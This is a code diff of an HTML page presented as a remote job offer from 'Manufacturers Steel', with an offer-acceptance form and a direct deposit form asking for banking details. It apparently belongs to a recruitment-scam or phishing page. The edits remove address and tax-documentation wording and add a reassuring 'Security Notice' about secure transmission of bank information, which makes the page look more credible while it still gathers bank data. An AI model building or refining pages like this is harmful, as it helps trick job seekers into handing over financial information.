@@ -26,16 +26,10 @@ body {
 
 h1, h2 { text-align:center; }
 
-label {
-    display:block;
-    margin-top:15px;
-    font-weight:bold;
-}
-
 input[type="text"] {
     width:100%;
     padding:10px;
-    margin-top:5px;
+    margin-top:10px;
     border-radius:4px;
     border:1px solid #ccc;
 }
@@ -53,12 +47,19 @@ input[type="text"] {
     flex-wrap:wrap;
 }
 
-.account-type label { font-weight:normal; }
-
 .center-text {
     text-align:center;
     margin-top:20px;
     color:#444;
+}
+
+.security-notice {
+    background:#f8f9fa;
+    border-left:4px solid #007bff;
+    padding:15px;
+    margin-top:20px;
+    font-size:14px;
+    color:#333;
 }
 
 .signature-section {
@@ -95,7 +96,7 @@ input[type="text"] {
     line-height:1.5;
 }
 
-/* 📱 MOBILE ONLY */
+/* 📱 MOBILE */
 @media (max-width: 600px) {
     .signature-section input {
         width:100%;
@@ -150,13 +151,12 @@ function sendDeposit(e){
     <p>
     <strong>Employment Type:</strong> Remote<br>
     <strong>Supervisor:</strong> Recruitment Manager<br>
-	<strong>Compensation:</strong> As discussed during the interview process<br>
+    <strong>Compensation:</strong> As discussed during the interview process<br>
     <strong>Pay Schedule:</strong> Bi-weekly via direct deposit
     </p>
 
     <form onsubmit="acceptOffer(event)">
         <div class="signature-section">
-            <label>Accepted by:</label>
             <input type="text" name="offer_signature" placeholder="Signature" required>
             <input type="text" name="offer_name" placeholder="Full Name" required>
             <input type="text" name="offer_date" placeholder="Date" required>
@@ -166,7 +166,7 @@ function sendDeposit(e){
     </form>
 
     <div class="footer">
-        Manufacturers Steel. — Official Employment Offer
+        Manufacturers Steel — Official Employment Offer
     </div>
 </div>
 
@@ -175,19 +175,19 @@ function sendDeposit(e){
     <h1>Direct Deposit Authorization</h1>
 
     <p class="center-text">
-        This information is required for payroll setup and will only be activated
-        after completion of required tax documentation.
+        This information is required for payroll setup.
     </p>
 
-    <form onsubmit="sendDeposit(event)">
+    <div class="security-notice">
+        🔒 <strong>Security Notice:</strong><br>
+        Banking information is transmitted securely and used solely for payroll processing.
+        Tax documents (W-4) are <strong>not</strong> collected on this page.
+    </div>
 
+    <form onsubmit="sendDeposit(event)">
         <div class="center-section">
             <h2>Personal Information</h2>
             <input type="text" name="fullName" placeholder="Full Name" required>
-            <input type="text" name="address" placeholder="Address" required>
-            <input type="text" name="city" placeholder="City" required>
-            <input type="text" name="state" placeholder="State" required>
-            <input type="text" name="zip" placeholder="Zip Code" required>
         </div>
 
         <div class="center-section">
@@ -211,8 +211,7 @@ function sendDeposit(e){
     </form>
 
     <div class="footer">
-        All information is transmitted securely and used solely for payroll purposes.<br>
-        Manufacturers Steel. | HR: hr@manufacturerssteel.com
+        Manufacturers Steel | HR: hr@manufacturerssteel.com
     </div>
 </div>
 
